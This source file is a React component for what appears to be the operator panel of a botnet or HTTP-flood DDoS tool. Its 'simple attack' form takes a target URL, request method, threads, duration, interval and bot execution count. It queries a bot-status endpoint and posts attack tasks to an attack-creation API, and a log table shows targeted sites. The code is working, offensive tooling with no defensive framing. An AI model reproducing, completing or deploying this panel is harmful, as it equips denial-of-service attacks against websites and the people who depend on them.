import React from 'react';
import {
  Row,
  Card,
  CardBody,
  Input,
  CardTitle,
  FormGroup,
  Label,
  CustomInput,
  Button,
  FormText,
  Form,
  Table,
} from 'reactstrap';
import IntlMessages from '../../../helpers/IntlMessages';
import { Colxx, Separator } from '../../../components/common/CustomBootstrap';
import Breadcrumb from '../../../containers/navs/Breadcrumb';
import { NotificationManager } from '../../../components/common/react-notifications';
import axios from 'axios';

const onFormSubmit = (e) => {
  const data = new FormData(e.target);
  if (Number(data.get('numberOfExecutions')) === 0) {
    axios
      .get('/api/status/bot?type=status', {
        headers: {
          "Token": localStorage.getItem('token'),
        },
      })
      .then((res) => {
        if (res.data.code === 200) {
          axios
            .post('/api/task/create?type=attack', JSON.stringify({
              attackType: "simple",
              method: data.get('attackMethod'),
              target: data.get('targetURL'),
              thread: Number(data.get('attackThread')),
              duration: Number(data.get('attackDuration')),
              interval: Number(data.get('attackInterval')),
              targetExecution: Number(res.data.value.split('/')[0]),
            }), {
              headers: {
                "Token": localStorage.getItem('token'),
              },
            })
            .then((res2) => {
              if (res2.data.code === 200) {
                createNotification('success', null, "Succeed!", res2.data.message);
              }
            })
            .catch((error) => {
              createNotification('error', null, "Failed!", error.response.data.message);
            })
        }
      })
      .catch((error) => {
        createNotification('error', null, "Failed!", error.response.data.message);
      })
  } else {
    axios
      .post('/api/task/create?type=attack', JSON.stringify({
        attackType: "simple",
        method: data.get('attackMethod'),
        target: data.get('targetURL'),
        thread: Number(data.get('attackThread')),
        duration: Number(data.get('attackDuration')),
        interval: Number(data.get('attackInterval')),
        targetExecution: Number(data.get('numberOfExecutions')),
      }), {
        headers: {
          "Token": localStorage.getItem('token'),
        },
      })
      .then((res) => {
        if (res.data.code === 200) {
          createNotification('success', null, "Succeed!", res.data.message);
        }
      })
      .catch((error) => {
        createNotification('error', null, "Failed!", error.response.data.message);
      })
  }
  e.preventDefault();
}

const createNotification = (type, className, title, content) => {
  const cName = className || '';
  switch (type) {
    case 'primary':
      NotificationManager.primary(
        content,
        title,
        3000,
        null,
        null,
        cName
      );
      break;
    case 'secondary':
      NotificationManager.secondary(
        content,
        title,
        3000,
        null,
        null,
        cName
      );
      break;
    case 'info':
      NotificationManager.info('Info message', '', 3000, null, null, cName);
      break;
    case 'success':
      NotificationManager.success(
        content,
        title,
        3000,
        null,
        null,
        cName
      );
      break;
    case 'warning':
      NotificationManager.warning(
        content,
        title,
        3000,
        null,
        null,
        cName
      );
      break;
    case 'error':
      NotificationManager.error(
        content,
        title,
        5000,
        () => {
          alert('callback');
        },
        null,
        cName
      );
      break;
    default:
      NotificationManager.info('Info message');
      break;
  }
};

const SimpleDefault = ({ match, attackLogs }) => (
    <>
      <Row>
        <Colxx xxs="12">
          <Breadcrumb heading="menu.attack.simple" match={match} />
          <Separator className="mb-5" />
        </Colxx>
      </Row>
      <Row className="mb-4">
        <Colxx xxs="6">
          <Card>
            <CardBody>
              <CardTitle>
                <IntlMessages id="forms.simple-attack" />
              </CardTitle>
              <Form onSubmit={onFormSubmit}>
                <FormGroup>
                  <Label for="attackMethod">
                    <IntlMessages id="forms.attack-method" />
                  </Label>
                  <div>
                    <CustomInput
                      defaultChecked
                      inline
                      type="radio"
                      id="attackMethod"
                      name="attackMethod"
                      label="GET"
                      value="GET"
                    />
                    <CustomInput
                      inline
                      type="radio"
                      id="attackMethod2"
                      name="attackMethod"
                      label="POST"
                      value="POST"
                    />
                    <CustomInput
                      inline
                      type="radio"
                      id="attackMethod3"
                      name="attackMethod"
                      label="HEAD"
                      value="HEAD"
                    />
                  </div>
                </FormGroup>

                <FormGroup>
                  <Label for="targetURL">
                    <IntlMessages id="forms.target-url" />
                  </Label>
                  <Input
                    required
                    type="text"
                    name="targetURL"
                    id="targetURL"
                    placeholder="https://example.com/login"
                  />
                  <FormText color="muted">
                    <IntlMessages id="forms.target-url-muted" />
                  </FormText>
                </FormGroup>

                <FormGroup>
                  <Label for="attackThread">
                    <IntlMessages id="forms.attack-thread" />
                  </Label>
                  <Input
                    required
                    type="number"
                    name="attackThread"
                    id="attackThread"
                    placeholder="300"
                  />
                </FormGroup>

                <FormGroup>
                  <Label for="attackDuration">
                    <IntlMessages id="forms.attack-duration" />
                  </Label>
                  <Input
                    required
                    type="number"
                    name="attackDuration"
                    id="attackDuration"
                    placeholder="600"
                  />
                </FormGroup>

                <FormGroup>
                  <Label for="attackInterval">
                    <IntlMessages id="forms.attack-interval" />
                  </Label>
                  <Input
                    required
                    type="number"
                    name="attackInterval"
                    id="attackInterval"
                    placeholder="10"
                  />
                </FormGroup>

                <FormGroup>
                  <Label for="numberOfExecutions">
                    <IntlMessages id="forms.number-of-executions" />
                  </Label>
                  <Input
                    required
                    type="number"
                    name="numberOfExecutions"
                    id="numberOfExecutions"
                    placeholder="50"
                  />
                  <FormText color="muted">
                    <IntlMessages id="forms.number-of-executions-muted" />
                  </FormText>
                </FormGroup>

                <Button color="primary" className="mt-4">
                  <IntlMessages id="forms.submit" />
                </Button>
              </Form>
            </CardBody>
          </Card>
        </Colxx>

        <Colxx xxs="6">
          <Card className="mb-4">
            <CardBody>
              <CardTitle>
                <IntlMessages id="table.attack-log" />
              </CardTitle>
              <Table>
                <thead>
                  <tr>
                    <th>#</th>
                    <th>Target</th>
                    <th>Executed</th>
                  </tr>
                </thead>
                <tbody>
                  {(attackLogs || [])
                    .filter((x) => x.attackType === 'simple')
                    .map((x) => {
                      return (
                        <tr>
                          <th scope="row">{x.id}</th>
                          <td>{x.target}</td>
                          <td>{x.currentExecution}</td>
                        </tr>
                      );
                    })}
                </tbody>
              </Table>
            </CardBody>
          </Card>
        </Colxx>
      </Row>
    </>
  );

export default SimpleDefault;
